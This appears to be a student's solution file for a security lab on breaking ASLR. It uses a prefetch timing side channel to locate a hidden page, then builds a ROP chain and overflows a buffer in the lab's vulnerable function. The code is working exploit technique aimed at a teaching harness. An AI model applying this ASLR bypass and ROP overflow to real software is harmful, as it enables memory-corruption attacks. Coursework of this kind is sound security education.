/*
 * Address Space Layout Randomization
 * Part 3
 */

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <stdint.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <time.h>
#include <mmintrin.h>
#include <xmmintrin.h>
#include <fcntl.h>
#include <errno.h>
#include <stdbool.h>
#include <x86intrin.h>
#include "lab.h"

static inline void cpuid(void) {
    asm volatile (
        "cpuid"
        :
        : "a"(0)
        : "ebx", "ecx", "edx", "memory"
    );
}

// Same as in Part 2
extern void vulnerable(char *your_string);
extern void call_me_maybe(uint64_t rdi, uint64_t rsi, uint64_t rdx);

// Your code:
uint64_t find_address(uint64_t low_bound, uint64_t high_bound);
void do_overflow(uint64_t page_addr);

uint64_t find_address(uint64_t low_bound, uint64_t high_bound) {
	int junk;
	uint64_t t1, t2, tmin, addrmin;
	char *aux;

	tmin = 0;
    for (uint64_t addr = low_bound; addr < high_bound; addr += PAGE_SIZE) {
		aux = (char *)addr;

		_mm_mfence();
		cpuid();
		t1 = __rdtscp(&junk);
		// Avisamos a la CPU de que precargue la direccion
		_mm_prefetch(aux, _MM_HINT_T2);
		t2 = __rdtscp(&junk);
		cpuid();
		_mm_mfence();

		// No ponemos un umbral de minimo sino que cogemos el tiempo mas corto
		if ((tmin == 0) || (t2-t1) < tmin)
		{
			tmin = t2-t1;
			addrmin = addr;
		}
	}

    return addrmin;
}

/*
 * do_overflow
 * Construct the ROP chain and execute it using the gadgets we found by breaking ASLR.
 */
void do_overflow(uint64_t page_addr) {

    // Put your Part 2 code here
    // Use the page you found with find_address
    // and the offsets located from objdump to find your gadgets
	uint64_t gadget1 = page_addr + 0x00;
	uint64_t gadget2 = page_addr + 0x10;
	uint64_t gadget3 = page_addr + 0x20;
	uint64_t gadget4 = page_addr + 0x30;
	uint64_t gadget5 = page_addr + 0x40;
	uint64_t gadget6 = page_addr + 0x50;
	
	
	char your_string[1024];
    memset(your_string, 0xFF, sizeof(your_string));
    your_string[1023] = '\n';

	uint64_t rop[] = {
						(uint64_t)gadget1,
						15,
						(uint64_t)gadget4,
						(uint64_t)gadget3,
						(uint64_t)gadget5,
						(uint64_t)gadget5,
						(uint64_t)gadget5,
						(uint64_t)gadget5,
						(uint64_t)gadget5,
						(uint64_t)gadget6,
						(uint64_t)gadget2,
						(uint64_t)gadget2,
						(uint64_t)call_me_maybe
					 };

	memcpy(&your_string[24], rop, sizeof(rop));
    vulnerable((char *)your_string);
}


/*
 * lab_code
 * This is called by main with the bounds for the hidden page, just
 * like in Part 1. You will locate the page and then execute a ROP
 * chain using payloads located in the page.
 */
void lab_code(uint64_t low_bound, uint64_t high_bound) {
    uint64_t found_page = find_address(low_bound, high_bound);
    do_overflow(found_page);
}
